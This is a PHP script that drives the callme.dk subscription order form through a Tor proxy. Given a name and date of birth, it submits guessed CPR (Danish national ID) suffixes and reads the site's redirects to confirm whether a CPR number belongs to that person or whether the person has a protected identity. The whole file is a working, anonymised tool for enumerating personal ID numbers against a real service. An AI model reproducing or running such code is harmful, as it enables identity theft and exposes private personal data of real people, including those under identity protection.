<?php

// check if Tor is running
if(isset($_GET["checkTor"])){
	$ch = curl_init();
	$tor = checkTor($ch, false);
	exit();
}

// if no session cookie is set - will return filename of php session cookie	
if(!isset($_POST["cookie"]) && !isset($_GET["debug"])){
	header('Content-type: application/json');	
	$cookie = initialSetup();
	echo json_encode($cookie);
	exit();
}


if(isset($_POST["firstName"]) || isset($_GET["debug"])){
	header('Content-type: text/html; charset=utf-8');
	
	$ch = curl_init();
	
	// manually encoding since I can't seem to prepare the content-type properly	
	$text = array('æ', 'ø', 'å');
	$ascii = array('%E6', '%F8', '%E5');	

	// set variables
	if(!isset($_GET["debug"])){
		$cookie = $_POST["cookie"];
		$firstName = str_replace($text, $ascii, strtolower($_POST["firstName"]));
		$lastName = str_replace($text, $ascii, strtolower($_POST["lastName"]));
		$dob = $_POST["dob"];	
		$cpr = $_POST["cpr"];	
		$email = $firstName."@".$lastName.".dk";
		$email = ereg_replace("[^a-zA-Z@\.]", "", $email);
		
	// set debug vars		
	}else{
		$cookie = "/tmp/COOKIEmzus8L";
		$firstName = "Peter";
		$lastName = "Madsen";
		$dob = "221289";	
		$cpr = "1625";	
		$email = $firstName."@".$lastName.".dk";
		$email = ereg_replace("[^a-zA-Z@\.]", "", $email);
	}
	
	// Step 4 - post personal info (name, cpr etc)
	$data4 = "task=submitOrderPersonalInfo&firstName=".$firstName."&lastName=".$lastName."&email=".$email."&emailConfirm=".$email."&CPR1=".$dob."&CPR2=".$cpr."&housing=Ejerbolig&occupation=Fuldtidsansat&civilStatus=Gift&memberClub=&memberNumber=&termsAccepted=1&bankRegNumber=&bankAccountNumber=&subscriptionPaymentMethod=noPaymentService&personlige=Videre%20til%20bestilling";

	$response4 = curl_wrapper(array(
		"url" => "https://www.callme.dk/pow-basic/4",
		"data" => $data4,
		"useCookie" => $cookie,
		"ch" => $ch,
	));
	
	// We were redirect. This means either:
	// 1) There is a match between CPR and person. Success! (redirect location will be /5)
	// 2) The CPR number is valid, however the person has secret identity. Therefore, cannot be confirmed. (redirect location will be /4b)
	if($response4[1]["http_code"] == 302){
	
		// determine 		
		$response4_headers_only = curl_wrapper(array(
			"url" => "https://www.callme.dk/pow-basic/4",
			"data" => $data4,
			"useCookie" => $cookie,
			"getHeaders" => true,			
			"ch" => $ch,
		));	
	
		$pattern_location = '/Location: .+\/(.*)/x';
		preg_match($pattern_location, $response4_headers_only[0], $location);	
		
		// request was accepted and redirected to next step = SUCCESS!
		if(trim($location[1]) == "5"){
			echo"success: ". $cpr;
		}elseif(trim($location[1]) == "4b"){
			echo "Hidden identity";
		}else{
			echo "Unknown redirect: ".$location[1];
		}
	}else{
		$pattern = '/<div class="error">(.+)<\/div>/s';
		preg_match($pattern, $response4[0], $matches);
		$pos = strpos($matches[1], "<table");
		$error = substr($matches[1], 0, $pos);
		echo trim($error);
	}
}



function checkTor($ch, $mute = true){

	// make sure we are anonymous
	$checkTor = curl_wrapper(array(
		"url" => "https://check.torproject.org/",
		"ch" => $ch
	));
	
	// get tor status message
	$pattern_msg = '/<h1.*?>(.*)<\/h1>/sx';	
	preg_match($pattern_msg, $checkTor[0], $msg);	
	
	// get ip address
	$pattern_ip = '/Your IP address appears to be: <b>(.*)<\/b>/s';	
	preg_match($pattern_ip, $checkTor[0], $ip);
	if(strpos($msg[1], "Sorry")){
		echo "Error: ";
		echo $msg[1];
		echo $ip[0];		
		return false;
	}else{
		if($mute===false){
			echo "Success: ";
			echo $msg[1];
			echo $ip[0];
		}
		return true;
	}	

}

/***************************
* get phpsession and complete first 3 steps
***************************/
function initialSetup(){

	// initiate curl
	$ch = curl_init();
	$tor = checkTor($ch);

	if($tor){
		$cookie = tempnam("/tmp", "COOKIE");	
		//$cookie = "testcookie";	

		// step1a - get session cookie
		curl_wrapper(array(
			"url" => "http://www.callme.dk/pow-basic/1",
			"ch" => $ch,
			"setCookie" => $cookie
		));

		// Step 1b - complete step 1
		$data1 = "variationId=590&task=submitOrderSubscription&subscriptionId=51";
		curl_wrapper(array(
			"url" => "http://www.callme.dk/pow-basic/1",
			"data" => $data1,
			"ch" => $ch
		));

		// Step 2
		$data2 = "task=submitOrderExtras&personlige=Videre%20til%20personlige%20oplysninger";
		curl_wrapper(array(
			"url" => "http://www.callme.dk/pow-basic/2",
			"data" => $data2,
			"ch" => $ch,
		));
	
		// Step 3a - get phone number
		while(!isset($phone)){
			$response3 = curl_wrapper(array(
				"url" => "http://www.callme.dk/pow-basic/3",
				"ch" => $ch,
			));	
	
			$pattern = '/<label for=\"newPhoneNumber[\d]+\">(\d+)<\/label>/';
			preg_match($pattern, $response3[0], $matches);
		
			if(isset($matches[0])){
				$phone = $matches[0];
			}
		}
	
		// Step 3b - post chosen phone number
		$data3 = "task=submitOrderPhoneNumber&currentCallMeNumber=&currentPhoneNumber=&currentOperator=&currentSIM=&phoneNumberType=newNumber&newPhoneNumber=".$phone."&saldoLimitAmount=";
		curl_wrapper(array(
			"url" => "http://www.callme.dk/pow-basic/3",
			"data" => $data3,
			"ch" => $ch,
		));
	}
	
	// close curl
	curl_close($ch);

	// return cookie filename	
	return array("cookie" => $cookie);

}

/***************************
* wrapper function for cURL requests
***************************/	
function curl_wrapper($options = array()){	
	$ch = $options["ch"];
	
	// init and set cookies
	if(isset($options["setCookie"])){
		curl_setopt ($ch, CURLOPT_COOKIEJAR, $options["setCookie"]);
	}elseif(isset($options["useCookie"])){
		curl_setopt ($ch, CURLOPT_COOKIEFILE, $options["useCookie"]);
	}
	
	// set URL
	curl_setopt($ch, CURLOPT_URL, $options["url"]);
	
	// return instead of echo result
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);		
	
	// set request method
	if(isset($options["data"])){
		curl_setopt($ch, CURLOPT_POST, true);						
		curl_setopt($ch, CURLOPT_POSTFIELDS, $options["data"]);
		$headers = array('Content-type: application/x-www-form-urlencoded;charset=utf-8'); 
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	}
	
	// set tor proxy
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	curl_setopt ($ch, CURLOPT_REFERER, "http://www.google.com/");  
	curl_setopt ($ch, CURLOPT_PROXY, "http://127.0.0.1:9050/");
	curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
	
	if(isset($options["getHeaders"])){
		curl_setopt($ch, CURLOPT_HEADER, TRUE);
	}
	
	// return response	
	$response = curl_exec($ch);
	$info = curl_getinfo($ch);
	return array($response, $info);
}

// debug outputting
function debug($output){
	$debug = "<pre>";
	$debug .= print_r($output, true);	
	$debug .= "</pre>";	

	echo $debug; 
}

?>
